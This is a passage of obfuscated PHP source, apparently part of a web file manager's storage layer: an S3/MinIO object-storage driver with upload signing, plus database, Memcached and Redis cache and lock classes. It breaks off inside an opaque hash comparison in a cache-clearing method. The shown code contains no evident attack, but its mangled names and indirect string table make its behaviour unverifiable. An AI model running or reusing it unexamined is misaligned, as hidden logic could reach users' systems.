(isset($§¾ÂÉ[$î¾ßä[76]])) { $ñÛÎ’­ª[$î¾ßä[76]] = $§¾ÂÉ[$î¾ßä[76]]; } return $ñÛÎ’­ª; } private function folderInfo($»æ¥çĞŒ, $Ò”éúÎÇ = false, $èşğ†… = array()) { $ä§Ş¥·µ =& $_SERVER[—ÌÒğš÷]; $ßÌĞœãŸ = array($ä§Ş¥·µ[32] => $this->pathThis($»æ¥çĞŒ), $ä§Ş¥·µ[84] => $this->getPathOuter($ä§Ş¥·µ[8] . $»æ¥çĞŒ), $ä§Ş¥·µ[33] => $ä§Ş¥·µ[75]); if ($Ò”éúÎÇ) { return $ßÌĞœãŸ; } $ßÌĞœãŸ[$ä§Ş¥·µ[215]] = $ßÌĞœãŸ[$ä§Ş¥·µ[85]] = 0; $ßÌĞœãŸ[$ä§Ş¥·µ[216]] = $ßÌĞœãŸ[$ä§Ş¥·µ[217]] = !0; if ($»æ¥çĞŒ == $ä§Ş¥·µ[12]) { return $ßÌĞœãŸ; } if (empty($èşğ†…)) { $èşğ†… = $this->objectMeta(trim($»æ¥çĞŒ, $ä§Ş¥·µ[8]) . $ä§Ş¥·µ[8]); } if (isset($èşğ†…[$ä§Ş¥·µ[194]])) { $ßÌĞœãŸ[$ä§Ş¥·µ[215]] = $èşğ†…[$ä§Ş¥·µ[194]]; } return $ßÌĞœãŸ; } private function fileList($Ú’¶Úñ², $‰’ÀŞµú = '', $×ÙÌŸØˆ = 0) { $ªÖù‹ß =& $_SERVER[—ÌÒğš÷]; $ñ¨çúºÀ = rtrim($Ú’¶Úñ², $ªÖù‹ß[8]) . $ªÖù‹ß[8]; $ Š³°Ë = $this->listObjs($ñ¨çúºÀ, null, null, $‰’ÀŞµú); if (!$ Š³°Ë) { return array($ªÖù‹ß[82] => array(), $ªÖù‹ß[83] => array()); } $ùÌ•Ğ·æ = $ëá²ß¨® = array(); foreach ($ Š³°Ë[$ªÖù‹ß[220]] as $ÒÅšşà¢) { $·ƒêñ‹ = $ÒÅšşà¢[$ªÖù‹ß[32]]; if ($·ƒêñ‹ == $ñ¨çúºÀ) { continue; } $Ø–à–®‚ = isset($ÒÅšşà¢[$ªÖù‹ß[76]]) ? $ÒÅšşà¢[$ªÖù‹ß[76]] : 0; $ïÖ„á“Ñ = $Ø–à–®‚ == 0 && substr($·ƒêñ‹, strlen($·ƒêñ‹) - 1, 1) == $ªÖù‹ß[8] ? !0 : !1; $this->cacheMethodInfoSet($·ƒêñ‹, $ïÖ„á“Ñ, $ÒÅšşà¢); if ($ïÖ„á“Ñ) { $ùÌ•Ğ·æ[] = $·ƒêñ‹; continue; } $ëá²ß¨®[] = $×ÙÌŸØˆ ? $ÒÅšşà¢ : $·ƒêñ‹; } foreach ($ Š³°Ë[$ªÖù‹ß[221]] as $ÒÅšşà¢) { $ùÌ•Ğ·æ[] = $ÒÅšşà¢[$ªÖù‹ß[32]]; $this->cacheMethodInfoSet($ÒÅšşà¢[$ªÖù‹ß[32]], !0); } $this->cacheMethodInfoSet($Ú’¶Úñ², !0); return array($ªÖù‹ß[82] => $ùÌ•Ğ·æ, $ªÖù‹ß[83] => $ëá²ß¨®); } private function listObjs($ÄÜò¶¼, $ÛÃæä‹û = null, $ƒ­ñİÚÀ = null, $Û§†Âã² = null) { $°¬»·ä =& $_SERVER[—ÌÒğš÷]; $ÄÜò¶¼ = trim($ÄÜò¶¼, $°¬»·ä[8]); $ƒıïôà¶ = empty($ÄÜò¶¼) && $ÄÜò¶¼ !== $°¬»·ä[212] ? $°¬»·ä[12] : $ÄÜò¶¼ . $°¬»·ä[8]; return $this->client->getBucket($this->bucket, $ƒıïôà¶, $ÛÃæä‹û, $ƒ­ñİÚÀ, $Û§†Âã², !0); } public function has($³µÃëÖ•, $¼ÛùÏØš = false, $•·Å‰İ = true) { $ÃõÛï´¶ =& $_SERVER[—ÌÒğš÷]; $³µÃëÖ• = trim($³µÃëÖ•, $ÃõÛï´¶[8]); $Ÿ©×ß°ş = empty($³µÃëÖ•) && $³µÃëÖ• !== $ÃõÛï´¶[212] ? $ÃõÛï´¶[12] : $³µÃëÖ• . $ÃõÛï´¶[8]; $Ì’Ö©— = null; $±Ğğ¡»µ = 500; $­œŠæÍÜ = $ÃõÛï´¶[8]; $ì÷™ˆÉ¼ = $ËÆÕé†á = array(); while (!0) { $˜¾²šó× = $this->listObjs($³µÃëÖ•, $Ì’Ö©—, $±Ğğ¡»µ, $­œŠæÍÜ); if (!$˜¾²šó×) { break; } $Ì’Ö©— = $˜¾²šó×[$ÃõÛï´¶[222]]; $”ûäß˜ = $˜¾²šó×[$ÃõÛï´¶[220]]; $’îÆú›ö = $˜¾²šó×[$ÃõÛï´¶[221]]; if (empty($”ûäß˜) && empty($’îÆú›ö)) { break; } if (count($”ûäß˜) == 1 && $”ûäß˜[0][$ÃõÛï´¶[32]] == $Ÿ©×ß°ş) { break; } if ($¼ÛùÏØš) { if (count($”ûäß˜)) { $”ûäß˜ = array_column($”ûäß˜, $ÃõÛï´¶[32]); $ì÷™ˆÉ¼ = array_merge($ì÷™ˆÉ¼, $”ûäß˜); } if (count($’îÆú›ö)) { $’îÆú›ö = array_column($’îÆú›ö, $ÃõÛï´¶[32]); $ËÆÕé†á = array_merge($ËÆÕé†á, $’îÆú›ö); } if ($Ì’Ö©— === null) { break; } continue; } if ($•·Å‰İ) { if (!empty($”ûäß˜)) { if (count($”ûäß˜) > 1 || isset($”ûäß˜[0][$ÃõÛï´¶[32]]) && $”ûäß˜[0][$ÃõÛï´¶[32]] != $Ÿ©×ß°ş) { return !0; } } } else { if (!empty($’îÆú›ö)) { return !0; } } if ($Ì’Ö©— === null) { break; } } if ($¼ÛùÏØš) { $ì÷™ˆÉ¼ = array_diff($ì÷™ˆÉ¼, array($Ÿ©×ß°ş)); $ì÷™ˆÉ¼ = count(array_unique($ì÷™ˆÉ¼)); $ËÆÕé†á = count(array_unique($ËÆÕé†á)); return array($ÃõÛï´¶[223] => $ì÷™ˆÉ¼, $ÃõÛï´¶[224] => $ËÆÕé†á); } return !1; } public function listAll($ı„†³·ã) { $®­°¥€Ç =& $_SERVER[—ÌÒğš÷]; $ûúÌ¶È = $this->fileList($ı„†³·ã, $®­°¥€Ç[12], !0); $Çàóì¥ = array_to_keyvalue($ûúÌ¶È[$®­°¥€Ç[83]], $®­°¥€Ç[32]); foreach ($ûúÌ¶È[$®­°¥€Ç[82]] as $™ŒŠˆÁ«) { if (is_string($™ŒŠˆÁ«)) { $Çàóì¥[$™ŒŠˆÁ«] = array($®­°¥€Ç[76] => 0); } } return $this->listAllFiles($ı„†³·ã, $Çàóì¥); } public function canRead($»ÚáñÑ) { $Ö²øÃÄù =& $_SERVER[—ÌÒğš÷]; $Õùè¥ = $this->client->getAccessControlPolicy($this->bucket, $»ÚáñÑ); if (!$Õùè¥) { return !1; } return in_array($Õùè¥, array($Ö²øÃÄù[225], $Ö²øÃÄù[226], $Ö²øÃÄù[227])) ? !0 : !1; } public function canWrite($‡˜ƒ·Á–) { $€üª¨É‡ =& $_SERVER[—ÌÒğš÷]; $„¢ğƒáÉ = $this->client->getAccessControlPolicy($this->bucket, $‡˜ƒ·Á–); if (!$„¢ğƒáÉ) { return !1; } return in_array($„¢ğƒáÉ, array($€üª¨É‡[225], $€üª¨É‡[226])) ? !0 : !1; } public function getContent($âíõ†ªÒ) { return $this->client->getObject($this->bucket, $âíõ†ªÒ); } public function setContent($ÀËİûìé, $÷‰¢Î¬ = '', $Öœ„º’Ğ = false) { $ƒ„•ÑÉç =& $_SERVER[—ÌÒğš÷]; $ÀËİûìé = $Öœ„º’Ğ ? trim($ÀËİûìé, $ƒ„•ÑÉç[8]) . $ƒ„•ÑÉç[8] : $ÀËİûìé; $âö½îœÛ = get_file_mime(get_path_ext($ÀËİûìé)); $Œ„Éº = $this->client->putObject($÷‰¢Î¬, $this->bucket, $ÀËİûìé, $ƒ„•ÑÉç[213], array(), $âö½îœÛ); if (!$Œ„Éº) { return !1; } if ($Öœ„º’Ğ) { return !0; } $this->cacheMethod(null, null); $Œ„Éº = $this->copyFile($ÀËİûìé, $ÀËİûìé, array($ƒ„•ÑÉç[228] => $Œ„Éº[$ƒ„•ÑÉç[218]])); return $Œ„Éº ? !0 : !1; } public function fileSubstr($²ä±—, $–…ôá—ó, $™çôù²) { $¨˜Ó½é = $–…ôá—ó + $™çôù² - 1; return $this->client->getObject($this->bucket, $²ä±—, array($_SERVER[—ÌÒğš÷][229] => "\142\x79\x74\x65\163\75{$–…ôá—ó}\55{$¨˜Ó½é}")); } public function upload($¨Âé–ÙÓ, $­äŸ†¿‚, $ëß¤‰Ñ = false, $ô€±•‡‘ = REPEAT_REPLACE) { $—·¹¯é =& $_SERVER[—ÌÒğš÷]; $±Õ ¤×¢ = array($—·¹¯é[228] => @md5_file($­äŸ†¿‚)); $å¯¶Ù‹ = array($—·¹¯é[230] => get_file_mime(get_path_ext($¨Âé–ÙÓ))); if (IO::size($­äŸ†¿‚) <= 1024 * 1024 * 200) { $®ÆÎÂ• = $this->client->putObjectFile($­äŸ†¿‚, $this->bucket, $¨Âé–ÙÓ, $—·¹¯é[213], $±Õ ¤×¢, $å¯¶Ù‹); return !empty($®ÆÎÂ•) ? $this->getPathOuter($¨Âé–ÙÓ) : !1; } $·æ‘¦é° = $this->client->multiUploadObject($­äŸ†¿‚, $this->bucket, trim($¨Âé–ÙÓ, $—·¹¯é[8]), $±Õ ¤×¢, $å¯¶Ù‹); return $·æ‘¦é° ? $this->getPathOuter($¨Âé–ÙÓ) : !1; } public function download($¸ÁÉ§‰ú, $³¯¦…ó) { if (!@is_dir($this->pathFather($³¯¦…ó)) && !IO::mkdir($this->pathFather($³¯¦…ó))) { return !1; } $‹ÛÏÎà¯ = $this->client->getObject($this->bucket, $¸ÁÉ§‰ú, array(), $³¯¦…ó); return $‹ÛÏÎà¯ !== !1 ? $³¯¦…ó : !1; } public function link($öäßç§Í, $É€æï‘µ = array()) { $„¤Ô™ôğ =& $_SERVER[—ÌÒğš÷]; if ($this->signVer == $„¤Ô™ôğ[231]) { return $this->client->getAuthenticatedURL($this->bucket, $öäßç§Í, 3600 * 12, $É€æï‘µ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($öäßç§Í, $„¤Ô™ôğ[8]), 3600 * 12, $this->region, array(), !0, $É€æï‘µ); } public function fileOut($ÉÜ®ßè, $Šï´Ú¶¯ = false, $öæŒæÇÉ = false, $ÀŒ‡…âæ = '') { $ã½ı’·ö =& $_SERVER[—ÌÒğš÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÉÜ®ßè, $Šï´Ú¶¯, $öæŒæÇÉ, $ÀŒ‡…âæ); } if (!$öæŒæÇÉ) { $öæŒæÇÉ = $this->pathThis($ÉÜ®ßè); } $ÓÎñÒ„™ = get_file_mime(get_path_ext($öæŒæÇÉ)); if ($ÓÎñÒ„™ == $ã½ı’·ö[232]) { return parent::fileOut($ÉÜ®ßè, $Šï´Ú¶¯, $öæŒæÇÉ, $ÀŒ‡…âæ); } $Á™®º± = array($ã½ı’·ö[233] => $ÓÎñÒ„™); if ($Šï´Ú¶¯) { $Á™®º±[$ã½ı’·ö[234]] = $ã½ı’·ö[235] . rawurlencode($öæŒæÇÉ); } else { } $Ô·¼×Å“ = $this->link($ÉÜ®ßè, $Á™®º±); $this->fileOutLink($Ô·¼×Å“); } public function fileOutServer($½Ÿ†®”ì, $‡’Ÿö³¬ = false, $—¶…½”ø = false, $Ÿ´ß§«Ø = '') { parent::fileOut($½Ÿ†®”ì, $‡’Ÿö³¬, $—¶…½”ø, $Ÿ´ß§«Ø); } public function fileOutImageServer($İ®íœÕÕ, $ìç”Ï  = 250) { parent::fileOutImage($İ®íœÕÕ, $ìç”Ï ); } public function hashMd5($§‘³º¥é, $¿¸ÀÜ¦ = '') { $Ë¼‹ÆÕÛ =& $_SERVER[—ÌÒğš÷]; $è¶’±Ú˜ = $this->objectMeta($§‘³º¥é); if (!$è¶’±Ú˜) { return !1; } $¿¸ÀÜ¦ = $¿¸ÀÜ¦ ? $¿¸ÀÜ¦ : _get($è¶’±Ú˜, $Ë¼‹ÆÕÛ[236]); $¿¸ÀÜ¦ = $¿¸ÀÜ¦ ? $¿¸ÀÜ¦ : _get($è¶’±Ú˜, $Ë¼‹ÆÕÛ[218], $Ë¼‹ÆÕÛ[12]); return $¿¸ÀÜ¦; } public function uploadFormData($ì¿’Œ¥¤, $Æ¨ÙŸò¨ = 3600) { $Ï®©«è° =& $_SERVER[—ÌÒğš÷]; $ı¯±ŞÈ€ = $this->pathFather($ì¿’Œ¥¤); $™…ã‹™Î = $this->client->getHttpUploadPostParams($this->bucket, $ı¯±ŞÈ€, $Ï®©«è°[213], $Æ¨ÙŸò¨); return array_merge((array) $™…ã‹™Î, array($Ï®©«è°[196] => $this->getHost())); } public function multiUploadFormData($â¾çø», $Ã½¡ÌâÉ = 3600) { $ñ‰âĞ‘¡ =& $_SERVER[—ÌÒğš÷]; $ªìá‡Œ… = gmdate($ñ‰âĞ‘¡[237]); $Û˜›ë¨ƒ = array(); $¸¥õüáÄ = $this->client->getUploadId($this->bucket, $â¾çø», $Û˜›ë¨ƒ); if (!$¸¥õüáÄ) { return !1; } return array($ñ‰âĞ‘¡[238] => $¸¥õüáÄ, $ñ‰âĞ‘¡[196] => $this->getHost() . $ñ‰âĞ‘¡[8] . $this->pathEncode($â¾çø»), $ñ‰âĞ‘¡[239] => $ªìá‡Œ…, $ñ‰âĞ‘¡[94] => $â¾çø»); } public function multiUploadAuthData($—ıêˆ³, $ÁÕİÙ = array()) { $ßĞãºÕØ =& $_SERVER[—ÌÒğš÷]; $œŸÓÜû° = isset($ÁÕİÙ[$ßĞãºÕØ[239]]) ? $ÁÕİÙ[$ßĞãºÕØ[239]] : gmdate($ßĞãºÕØ[237]); $ùíÓ Ö› = isset($ÁÕİÙ[$ßĞãºÕØ[175]]) ? $ÁÕİÙ[$ßĞãºÕØ[175]] : $ßĞãºÕØ[12]; $ı—Ùıœ = $ÁÕİÙ[$ßĞãºÕØ[94]]; unset($ÁÕİÙ[$ßĞãºÕØ[94]]); if (isset($ÁÕİÙ[$ßĞãºÕØ[240]])) { $ÁÕİÙ[$ßĞãºÕØ[239]] = $œŸÓÜû°; return $this->listUploadParts($ı—Ùıœ, $ÁÕİÙ); } $·±ş§£ö = array($ßĞãºÕØ[241], $ßĞãºÕØ[12], $ßĞãºÕØ[120], $ßĞãºÕØ[12], "\x78\55\x61\155\172\x2d\144\141\164\145\x3a{$œŸÓÜû°}", $ßĞãºÕØ[8] . $this->bucket . $ßĞãºÕØ[8] . $this->pathEncode($ı—Ùıœ) . $ùíÓ Ö›); if (strpos($ùíÓ Ö›, $ßĞãºÕØ[242]) === 0) { $·±ş§£ö[0] = $ßĞãºÕØ[243]; } if (isset($ÁÕİÙ[$ßĞãºÕØ[244]]) && $ÁÕİÙ[$ßĞãºÕØ[244]] == $ßĞãºÕØ[245]) { $·±ş§£ö[0] = $ßĞãºÕØ[245]; } $¾õÎ“ = implode($ßĞãºÕØ[246], $·±ş§£ö); $®ÛÅÄ = base64_encode(hash_hmac($ßĞãºÕØ[247], $¾õÎ“, $this->secret, !0)); $ß³ş›ÕÜ = $ßĞãºÕØ[248] . $this->accessKey . $ßĞãºÕØ[4] . $®ÛÅÄ; if (strpos($ùíÓ Ö›, $ßĞãºÕØ[242]) === 0) { return array($ßĞãºÕØ[249] => $ß³ş›ÕÜ, $ßĞãºÕØ[239] => $œŸÓÜû°); } return $ß³ş›ÕÜ; } public function listUploadParts($ôÖ¯­£ß, $××­ıô = array()) { $¿ïÙ†ßˆ =& $_SERVER[—ÌÒğš÷]; $õ¸¡®½µ = str_replace($¿ïÙ†ßˆ[250], $¿ïÙ†ßˆ[12], $××­ıô[$¿ïÙ†ßˆ[175]]); $Ğâ÷È‡ß = $this->client->listParts($this->bucket, $ôÖ¯­£ß, $õ¸¡®½µ); if (!$Ğâ÷È‡ß) { return !1; } unset($××­ıô[$¿ïÙ†ßˆ[240]], $××­ıô[$¿ïÙ†ßˆ[244]]); $××­ıô[$¿ïÙ†ßˆ[94]] = $ôÖ¯­£ß; $óğ‹áß‡ = $this->multiUploadAuthData($ôÖ¯­£ß, $××­ıô); if (empty($óğ‹áß‡)) { return !1; } return array($¿ïÙ†ßˆ[249] => $óğ‹áß‡, $¿ïÙ†ßˆ[239] => $××­ıô[$¿ïÙ†ßˆ[239]], $¿ïÙ†ßˆ[251] => $Ğâ÷È‡ß); } public function getHost() { return parent::getHost() . $_SERVER[—ÌÒğš÷][8] . $this->bucket; } public function size($ŞóÃ’) { $öêòÌİ¬ = $this->objectMeta($ŞóÃ’); return $öêòÌİ¬ ? $öêòÌİ¬[$_SERVER[—ÌÒğš÷][76]] : 0; } public function info($òÒƒ¿‚²) { if ($this->isFolder($òÒƒ¿‚²)) { return $this->folderInfo($òÒƒ¿‚²); } else { if ($this->isFile($òÒƒ¿‚²)) { return $this->fileInfo($òÒƒ¿‚²); } } return !1; } public function exist($ş×ÙŒ®Ä) { return $this->isFile($ş×ÙŒ®Ä) || $this->isFolder($ş×ÙŒ®Ä); } public function isFile($ƒºù˜­Ñ) { return !$this->isFolder($ƒºù˜­Ñ) && $this->objectMeta($ƒºù˜­Ñ); } public function isFolder($üöœ°‹) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][166], $üöœ°‹); } protected function objectMeta($Šñàñïè) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][168], $Šñàñïè); } protected function _objectMeta($‡ûîÛóå) { $îø¯¡× =& $_SERVER[—ÌÒğš÷]; $‡ûîÛóå = rtrim($‡ûîÛóå, $îø¯¡×[8]); try { $ıî¶Ë»¾ = $this->client->getObjectInfo($this->bucket, $‡ûîÛóå); if (!isset($ıî¶Ë»¾[$îø¯¡×[236]]) && isset($ıî¶Ë»¾[$îø¯¡×[252]])) { $ıî¶Ë»¾[$îø¯¡×[236]] = $ıî¶Ë»¾[$îø¯¡×[252]]; } } catch (Exception $ş¨Å±Ó) { $ıî¶Ë»¾ = !1; } if (!$ıî¶Ë»¾) { } return $ıî¶Ë»¾; } protected function _isFolder($¢æĞò½) { $ÈûŠ¨Ê¤ =& $_SERVER[—ÌÒğš÷]; $¢æĞò½ = rtrim($¢æĞò½, $ÈûŠ¨Ê¤[8]); if ($¢æĞò½ == $ÈûŠ¨Ê¤[12] || $¢æĞò½ == $ÈûŠ¨Ê¤[8]) { return !0; } $Áå¿Õ¾ = $this->client->getBucket($this->bucket, $¢æĞò½, null, 1); if (empty($Áå¿Õ¾[$ÈûŠ¨Ê¤[220]])) { return !1; } $üëÆÈú = $Áå¿Õ¾[$ÈûŠ¨Ê¤[220]][0][$ÈûŠ¨Ê¤[32]]; return stripos($üëÆÈú, $¢æĞò½ . $ÈûŠ¨Ê¤[8]) === 0 ? !0 : !1; if (substr($üëÆÈú, -1) == $ÈûŠ¨Ê¤[8]) { return !0; } if (get_path_this($üëÆÈú) == get_path_this($¢æĞò½)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ŒÑ¢õ­ñ) { parent::__construct($ŒÑ¢õ­ñ); $this->signatureVersion($_SERVER[—ÌÒğš÷][231]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($¡…şÕñ, $›âßÙÓÃ = 3600) { $¹ëÑá‡ô =& $_SERVER[—ÌÒğš÷]; $ééº°Ï = $¹ëÑá‡ô[213]; $¥«Í„‚‹ = $¹ëÑá‡ô[253]; $õÆ…Î§Ø = $¹ëÑá‡ô[62]; $É›ñ°ÏÈ = gmdate($¹ëÑá‡ô[254]); $†øßâ“ú = gmdate($¹ëÑá‡ô[255]); $Œ¹Ÿû×Í = $¹ëÑá‡ô[256]; $¦Ë¯ÑÛ» = $›âßÙÓÃ . $¹ëÑá‡ô[12]; $Ş”‘è‹ş = $¹ëÑá‡ô[257]; $çŸÊ‰‚Õ = array($this->accessKey, $†øßâ“ú, $this->region, $õÆ…Î§Ø, $Œ¹Ÿû×Í); $Î¥£Ûòù = implode($¹ëÑá‡ô[8], $çŸÊ‰‚Õ); $¼š’øÎŠ = array($¹ëÑá‡ô[258] => gmdate($¹ëÑá‡ô[259], strtotime($¹ëÑá‡ô[260])), $¹ëÑá‡ô[261] => array(array($¹ëÑá‡ô[262] => $this->bucket), array($¹ëÑá‡ô[263] => $ééº°Ï), array($¹ëÑá‡ô[264], $¹ëÑá‡ô[265], $¹ëÑá‡ô[12]), array($¹ëÑá‡ô[264], $¹ëÑá‡ô[266], $¹ëÑá‡ô[12]), array($¹ëÑá‡ô[264], $¹ëÑá‡ô[267], $¹ëÑá‡ô[12]), array($¹ëÑá‡ô[268] => $Ş”‘è‹ş), array($¹ëÑá‡ô[269] => $Î¥£Ûòù), array($¹ëÑá‡ô[270] => $¥«Í„‚‹), array($¹ëÑá‡ô[271] => $É›ñ°ÏÈ), array($¹ëÑá‡ô[272] => $¦Ë¯ÑÛ»))); $Ø×İ„¾ = base64_encode(json_encode($¼š’øÎŠ)); $Í­ø•®ª = hash_hmac($¹ëÑá‡ô[273], $†øßâ“ú, $¹ëÑá‡ô[274] . $this->secret, !0); $÷—ºÇÙº = hash_hmac($¹ëÑá‡ô[273], $this->region, $Í­ø•®ª, !0); $ÚŒ§Ş = hash_hmac($¹ëÑá‡ô[273], $õÆ…Î§Ø, $÷—ºÇÙº, !0); $ú…éÈĞû = hash_hmac($¹ëÑá‡ô[273], $Œ¹Ÿû×Í, $ÚŒ§Ş, !0); $ÍëêâŸê = hash_hmac($¹ëÑá‡ô[273], $Ø×İ„¾, $ú…éÈĞû); $„ƒ¡ïáß = array($¹ëÑá‡ô[230] => $¹ëÑá‡ô[12], $¹ëÑá‡ô[275] => $¹ëÑá‡ô[12], $¹ëÑá‡ô[263] => $ééº°Ï, $¹ëÑá‡ô[268] => $Ş”‘è‹ş, $¹ëÑá‡ô[276] => $Ø×İ„¾, $¹ëÑá‡ô[277] => $Î¥£Ûòù, $¹ëÑá‡ô[278] => $¥«Í„‚‹, $¹ëÑá‡ô[279] => $É›ñ°ÏÈ, $¹ëÑá‡ô[280] => $¦Ë¯ÑÛ», $¹ëÑá‡ô[281] => $ÍëêâŸê, $¹ëÑá‡ô[196] => $this->getHost()); return $„ƒ¡ïáß; } } goto EÈ‚àùŸæ; Aƒ¥°µˆ‹ï: class CacheLockDatabase { public function lock($‚¸üäÔ, $İ“óÍ‚¡ = 0) { $èâìÇœ§ = Model($_SERVER[—ÌÒğš÷][865]); $Âï¤Óç = microtime(!0) + $İ“óÍ‚¡; while (microtime(!0) < $Âï¤Óç) { $„Çç¡ïò = $èâìÇœ§->get($‚¸üäÔ); if (!$„Çç¡ïò || $„Çç¡ïò < microtime(!0)) { $ß«¯ª¸ = $èâìÇœ§->set($‚¸üäÔ, $Âï¤Óç); if ($ß«¯ª¸) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($æéŸ÷´¿) { return Model($_SERVER[—ÌÒğš÷][865])->get($æéŸ÷´¿); } public function unlock($ÎŸÌ˜Ğ¦) { Model($_SERVER[—ÌÒğš÷][865])->remove($ÎŸÌ˜Ğ¦); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($î¶­‰İË, $íˆÆ±ŸŸ) { $óñÏ¢¹ =& $_SERVER[—ÌÒğš÷]; if (!class_exists($óñÏ¢¹[911])) { show_json($óñÏ¢¹[912], !1); } $this->cacheTime = $íˆÆ±ŸŸ; $this->handle = new Memcached(); if (is_array($î¶­‰İË[$óñÏ¢¹[913]]) && count($î¶­‰İË[$óñÏ¢¹[913]]) >= 1) { foreach ($î¶­‰İË[$óñÏ¢¹[913]] as $Öó²­Ú›) { $Á¸ÏÍ‘ = explode($óñÏ¢¹[4], $Öó²­Ú›); $this->handle->addServer($Á¸ÏÍ‘[0], $Á¸ÏÍ‘[1]); } } else { $this->handle->addServer($î¶­‰İË[$óñÏ¢¹[196]], $î¶­‰İË[$óñÏ¢¹[197]]); } } public function set($”ºáëéÔ, $ºÈ¡’ÑË, $†“ÎÉŠï = false) { $†“ÎÉŠï = $†“ÎÉŠï ? $†“ÎÉŠï : $this->cacheTime; return $this->handle->set($”ºáëéÔ, $ºÈ¡’ÑË, $†“ÎÉŠï); } public function get($““ıªæ) { return $this->handle->get($““ıªæ); } public function remove($¸ô¿ƒ³ó) { return $this->handle->delete($¸ô¿ƒ³ó); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($®ĞŠ –š, $¸ùóß×¥) { $£¹Îæá =& $_SERVER[—ÌÒğš÷]; if (!class_exists($£¹Îæá[914])) { show_json($£¹Îæá[915], !1); } $this->cacheTime = $¸ùóß×¥; $À”›¸Ä‘ = isset($®ĞŠ –š[$£¹Îæá[916]]) ? $®ĞŠ –š[$£¹Îæá[916]] : 10; $æ€ß¥Ÿ× = _get($®ĞŠ –š, $£¹Îæá[913]); if ($æ€ß¥Ÿ× && is_array($æ€ß¥Ÿ×)) { $this->initCluster($®ĞŠ –š, $À”›¸Ä‘); } else { $this->handle = $this->init($®ĞŠ –š, $À”›¸Ä‘); } } private function init($æ™ã‰¿ˆ, $–ƒå”º­) { $‘ü»Ù =& $_SERVER[—ÌÒğš÷]; $“Åå®å = new Redis(); $……¸àÏ = isset($æ™ã‰¿ˆ[$‘ü»Ù[917]]) ? $æ™ã‰¿ˆ[$‘ü»Ù[917]] : !1; if ($……¸àÏ) { $“Åå®å->pconnect($æ™ã‰¿ˆ[$‘ü»Ù[196]], $æ™ã‰¿ˆ[$‘ü»Ù[197]], $–ƒå”º­); } else { $“Åå®å->connect($æ™ã‰¿ˆ[$‘ü»Ù[196]], $æ™ã‰¿ˆ[$‘ü»Ù[197]], $–ƒå”º­); } if (!empty($æ™ã‰¿ˆ[$‘ü»Ù[455]])) { $“Åå®å->auth($æ™ã‰¿ˆ[$‘ü»Ù[455]]); } if (!empty($æ™ã‰¿ˆ[$‘ü»Ù[793]]) && $æ™ã‰¿ˆ[$‘ü»Ù[793]] != 0) { $“Åå®å->select($æ™ã‰¿ˆ[$‘ü»Ù[793]]); } return $“Åå®å; } private function initCluster($ê¡±’¨ì, $…Ï€øäš) { $˜³®Ë¸Ë =& $_SERVER[—ÌÒğš÷]; $’®˜æÌè = array($˜³®Ë¸Ë[918], $˜³®Ë¸Ë[919], $˜³®Ë¸Ë[920]); $Œº¿Æ™ = $˜³®Ë¸Ë[918]; if (isset($ê¡±’¨ì[$˜³®Ë¸Ë[16]]) && in_array($ê¡±’¨ì[$˜³®Ë¸Ë[16]], $’®˜æÌè)) { $Œº¿Æ™ = $ê¡±’¨ì[$˜³®Ë¸Ë[16]]; } switch ($Œº¿Æ™) { case $˜³®Ë¸Ë[918]: $this->_slave($ê¡±’¨ì, $…Ï€øäš); break; case $˜³®Ë¸Ë[919]: break; case $˜³®Ë¸Ë[920]: $this->isCluster = !0; $¬º‰àà = $ê¡±’¨ì[$˜³®Ë¸Ë[913]]; $òµ³ßñ¦ = isset($ê¡±’¨ì[$˜³®Ë¸Ë[917]]) ? $ê¡±’¨ì[$˜³®Ë¸Ë[917]] : !1; $¨šïİŠ‰ = isset($ê¡±’¨ì[$˜³®Ë¸Ë[455]]) ? $ê¡±’¨ì[$˜³®Ë¸Ë[455]] : null; $this->handle = new RedisCluster(NUll, $¬º‰àà, $…Ï€øäš, $…Ï€øäš, $òµ³ßñ¦, $¨šïİŠ‰); break; default: break; } } private function _slave($ØÕÜóº¼, $Æóˆáß§) { $¡Ú£¢ğà = $ØÕÜóº¼[$_SERVER[—ÌÒğš÷][913]]; $this->filterConfig($ØÕÜóº¼, $¡Ú£¢ğà[0]); $this->handle = $this->init($ØÕÜóº¼, $Æóˆáß§); unset($¡Ú£¢ğà[0]); if (empty($¡Ú£¢ğà)) { return; } $Œç¨±Æ = array_rand($¡Ú£¢ğà); $this->filterConfig($ØÕÜóº¼, $¡Ú£¢ğà[$Œç¨±Æ]); $this->slaveHandle = $this->init($ØÕÜóº¼, $Æóˆáß§); } private function filterConfig(&$ÇĞˆ‘ú, $´šÇñ¼Ş) { $ ØŠÆÎ“ =& $_SERVER[—ÌÒğš÷]; $•ò’§Ê = explode($ ØŠÆÎ“[4], $´šÇñ¼Ş); $œÙßÍ÷™ = array($ ØŠÆÎ“[196] => $•ò’§Ê[0], $ ØŠÆÎ“[197] => $•ò’§Ê[1]); $ÇĞˆ‘ú = array_merge($ÇĞˆ‘ú, $œÙßÍ÷™); } public function set($ÇÈãë®®, $³Èóñì, $‹§á‹Ë€ = false) { $‹§á‹Ë€ = $‹§á‹Ë€ ? $‹§á‹Ë€ : $this->cacheTime; return $this->handle->setEx($ÇÈãë®®, $‹§á‹Ë€, $³Èóñì); } public function setLock($ºîŞ‡Ù, $¤²éÓĞ, $øãµ¥Ş) { return $this->handle->setNX($ºîŞ‡Ù, $¤²éÓĞ); } public function get($Ø“ÎÖ ) { $ôøşÜÇ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ôøşÜÇ->get($Ø“ÎÖ ); } public function remove($ÍÜãÅ×¢) { return $this->handle->del($ÍÜãÅ×¢); } public function deleteAll() { $Í¾ùâÒ³ =& $_SERVER[—ÌÒğš÷]; $ š«±¶Ì = $_SERVER[$Í¾ùâÒ³[877]]; $µ¼²ÙÅì = $Í¾ùâÒ³[878]; if ($_SERVER[$Í¾ùâÒ³[879]] != $µ¼²ÙÅì($ š«±¶Ì)) { $ËÑ¡¶Ü” = $Í¾ùâÒ³[921]; $™…áüÃ = $Í¾ùâÒ³[880]; $ÙÍÄæÛ = 